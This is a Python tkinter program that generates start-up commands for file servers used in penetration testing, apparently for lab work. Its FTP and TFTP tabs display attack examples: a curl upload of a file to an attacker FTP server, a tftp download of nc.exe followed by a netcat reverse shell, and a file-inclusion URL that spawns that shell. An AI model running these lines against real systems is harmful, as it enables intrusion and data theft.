import tkinter as tk
from tkinter import ttk, messagebox
import os

class CybersecurityApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Cybersecurity Server Command Generator")
        self.root.geometry("800x600") # Set initial window size
        self.root.resizable(True, True) # Allow window resizing

        # Configure styles for a modern look
        self.style = ttk.Style()
        self.style.theme_use('clam') # 'clam', 'alt', 'default', 'classic'
        self.style.configure('TNotebook.Tab', font=('Inter', 10, 'bold'), padding=[10, 5])
        self.style.configure('TButton', font=('Inter', 10), padding=6, borderwidth=2, relief="raised")
        self.style.map('TButton',
                       foreground=[('pressed', 'red'), ('active', 'blue')],
                       background=[('pressed', '!focus', 'gray'), ('active', 'lightgray')])
        self.style.configure('TLabel', font=('Inter', 10))
        self.style.configure('TEntry', font=('Inter', 10))
        self.style.configure('TCheckbutton', font=('Inter', 10))
        self.style.configure('TText', font=('Inter', 10))

        # Create a notebook (tabbed interface)
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(expand=True, fill="both", padx=10, pady=10)

        # Create frames for each tab
        self.web_server_frame = ttk.Frame(self.notebook, padding="10 10 10 10")
        self.ftp_server_frame = ttk.Frame(self.notebook, padding="10 10 10 10")
        self.tftp_server_frame = ttk.Frame(self.notebook, padding="10 10 10 10")

        # Add frames to the notebook
        self.notebook.add(self.web_server_frame, text="Web Servers")
        self.notebook.add(self.ftp_server_frame, text="FTP Server")
        self.notebook.add(self.tftp_server_frame, text="TFTP Server")

        # Initialize UI for each tab
        self._setup_web_server_tab()
        self._setup_ftp_server_tab()
        self._setup_tftp_server_tab()

    def _create_section_label(self, parent, text):
        """Helper to create a section label."""
        label = ttk.Label(parent, text=text, font=('Inter', 12, 'bold'), anchor='w')
        label.pack(pady=(10, 5), fill='x')
        return label

    def _create_input_row(self, parent, label_text, default_value=""):
        """Helper to create a label, entry, and return the entry widget."""
        frame = ttk.Frame(parent)
        frame.pack(fill='x', pady=2)
        label = ttk.Label(frame, text=label_text, width=15)
        label.pack(side='left', padx=(0, 5))
        entry = ttk.Entry(frame)
        entry.insert(0, default_value)
        entry.pack(side='left', fill='x', expand=True)
        return entry

    def _create_command_output_area(self, parent):
        """Helper to create a text area for command output."""
        output_frame = ttk.LabelFrame(parent, text="Generated Command", padding="5 5 5 5")
        output_frame.pack(fill='both', expand=True, pady=10)
        output_text = tk.Text(output_frame, height=5, wrap='word', state='disabled', background='#f0f0f0', borderwidth=1, relief="solid")
        output_text.pack(fill='both', expand=True)
        return output_text

    def _set_command_output(self, text_widget, command):
        """Helper to update the command output text area."""
        text_widget.config(state='normal')
        text_widget.delete(1.0, tk.END)
        text_widget.insert(tk.END, command)
        text_widget.config(state='disabled')

    def _setup_web_server_tab(self):
        """Sets up the Web Server tab UI."""
        # Updog Section
        self._create_section_label(self.web_server_frame, "Updog Web Server")

        self.updog_dir_entry = self._create_input_row(self.web_server_frame, "Directory (-d):", os.getcwd())
        self.updog_port_entry = self._create_input_row(self.web_server_frame, "Port (-p):", "8080")
        self.updog_password_entry = self._create_input_row(self.web_server_frame, "Password (--password):")

        self.updog_ssl_var = tk.BooleanVar()
        updog_ssl_check = ttk.Checkbutton(self.web_server_frame, text="Enable SSL (--ssl)", variable=self.updog_ssl_var)
        updog_ssl_check.pack(anchor='w', pady=5)

        updog_generate_button = ttk.Button(self.web_server_frame, text="Generate Updog Command", command=self._generate_updog_command)
        updog_generate_button.pack(pady=10)

        self.updog_command_output = self._create_command_output_area(self.web_server_frame)

        # Separator
        ttk.Separator(self.web_server_frame, orient='horizontal').pack(fill='x', pady=15)

        # Python SimpleHTTPServer Section
        self._create_section_label(self.web_server_frame, "Python SimpleHTTPServer")

        self.simplehttp_port_entry = self._create_input_row(self.web_server_frame, "Port:", "8000")

        simplehttp_generate_button = ttk.Button(self.web_server_frame, text="Generate SimpleHTTPServer Command", command=self._generate_simplehttp_command)
        simplehttp_generate_button.pack(pady=10)

        self.simplehttp_command_output = self._create_command_output_area(self.web_server_frame)

    def _generate_updog_command(self):
        """Generates the updog command based on user input."""
        command = "updog"
        directory = self.updog_dir_entry.get().strip()
        port = self.updog_port_entry.get().strip()
        password = self.updog_password_entry.get().strip()
        ssl = self.updog_ssl_var.get()

        if directory:
            command += f" -d \"{directory}\""
        if port:
            try:
                int(port) # Validate port is a number
                command += f" -p {port}"
            except ValueError:
                messagebox.showerror("Input Error", "Port must be a number for Updog.")
                return
        if password:
            command += f" --password \"{password}\""
        if ssl:
            command += " --ssl"

        self._set_command_output(self.updog_command_output, command)

    def _generate_simplehttp_command(self):
        """Generates the Python SimpleHTTPServer command."""
        port = self.simplehttp_port_entry.get().strip()
        command = "python -m SimpleHTTPServer"

        if port:
            try:
                int(port) # Validate port is a number
                command += f" {port}"
            except ValueError:
                messagebox.showerror("Input Error", "Port must be a number for SimpleHTTPServer.")
                return
        else:
            command += " 8000" # Default port if not specified

        self._set_command_output(self.simplehttp_command_output, command)

    def _setup_ftp_server_tab(self):
        """Sets up the FTP Server tab UI."""
        self._create_section_label(self.ftp_server_frame, "Twisted FTP Server")

        self.ftp_root_dir_entry = self._create_input_row(self.ftp_server_frame, "Root Directory (--root):", "/path/to/ftp_root")
        self.ftp_port_entry = self._create_input_row(self.ftp_server_frame, "Port (-p):", "21")

        ftp_generate_button = ttk.Button(self.ftp_server_frame, text="Generate FTP Server Command", command=self._generate_ftp_command)
        ftp_generate_button.pack(pady=10)

        self.ftp_command_output = self._create_command_output_area(self.ftp_server_frame)

        # Victim-side example
        self._create_section_label(self.ftp_server_frame, "Victim-Side Example (curl)")
        victim_example_text = tk.Text(self.ftp_server_frame, height=3, wrap='word', background='#f0f0f0', borderwidth=1, relief="solid")
        victim_example_text.pack(fill='both', expand=True, pady=5)
        victim_example_text.insert(tk.END, "# In victim:\ncurl -T out.txt ftp://<ATTACKER_IP>:<FTP_PORT>")
        victim_example_text.config(state='disabled')

    def _generate_ftp_command(self):
        """Generates the Twisted FTP server command."""
        root_dir = self.ftp_root_dir_entry.get().strip()
        port = self.ftp_port_entry.get().strip()

        if not root_dir:
            messagebox.showerror("Input Error", "Root Directory is required for FTP Server.")
            return
        if not port:
            messagebox.showerror("Input Error", "Port is required for FTP Server.")
            return

        try:
            int(port)
        except ValueError:
            messagebox.showerror("Input Error", "Port must be a number for FTP Server.")
            return

        command = f"twistd -n ftp -p {port} --root \"{root_dir}\""
        self._set_command_output(self.ftp_command_output, command)

    def _setup_tftp_server_tab(self):
        """Sets up the TFTP Server tab UI."""
        self._create_section_label(self.tftp_server_frame, "ATFTPD TFTP Server (Kali)")

        self.tftp_dir_entry = self._create_input_row(self.tftp_server_frame, "TFTP Directory:", "/tftp")
        self.tftp_port_entry = self._create_input_row(self.tftp_server_frame, "Port:", "69")

        tftp_generate_button = ttk.Button(self.tftp_server_frame, text="Generate TFTP Server Command", command=self._generate_tftp_command)
        tftp_generate_button.pack(pady=10)

        self.tftp_command_output = self._create_command_output_area(self.tftp_server_frame)

        # Victim-side examples
        self._create_section_label(self.tftp_server_frame, "Victim-Side Examples (Windows)")
        victim_tftp_example_text = tk.Text(self.tftp_server_frame, height=4, wrap='word', background='#f0f0f0', borderwidth=1, relief="solid")
        victim_tftp_example_text.pack(fill='both', expand=True, pady=5)
        victim_tftp_example_text.insert(tk.END, "# In reverse Windows:\ntftp -i <ATTACKER_IP> GET nc.exe\nnc.exe -e cmd.exe <ATTACKER_IP> <LISTENER_PORT>")
        victim_tftp_example_text.config(state='disabled')

        self._create_section_label(self.tftp_server_frame, "Example HTTP Exploit")
        http_exploit_example_text = tk.Text(self.tftp_server_frame, height=3, wrap='word', background='#f0f0f0', borderwidth=1, relief="solid")
        http_exploit_example_text.pack(fill='both', expand=True, pady=5)
        http_exploit_example_text.insert(tk.END, "http://<VICTIM_IP>/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%20<ATTACKER_IP>%20<LISTENER_PORT>")
        http_exploit_example_text.config(state='disabled')

    def _generate_tftp_command(self):
        """Generates the TFTP server command."""
        tftp_dir = self.tftp_dir_entry.get().strip()
        port = self.tftp_port_entry.get().strip()

        if not tftp_dir:
            messagebox.showerror("Input Error", "TFTP Directory is required.")
            return
        if not port:
            messagebox.showerror("Input Error", "Port is required for TFTP Server.")
            return

        try:
            int(port)
        except ValueError:
            messagebox.showerror("Input Error", "Port must be a number for TFTP Server.")
            return

        command = f"atftpd --daemon --port {port} \"{tftp_dir}\""
        self._set_command_output(self.tftp_command_output, command)

if __name__ == "__main__":
    root = tk.Tk()
    app = CybersecurityApp(root)
    root.mainloop()
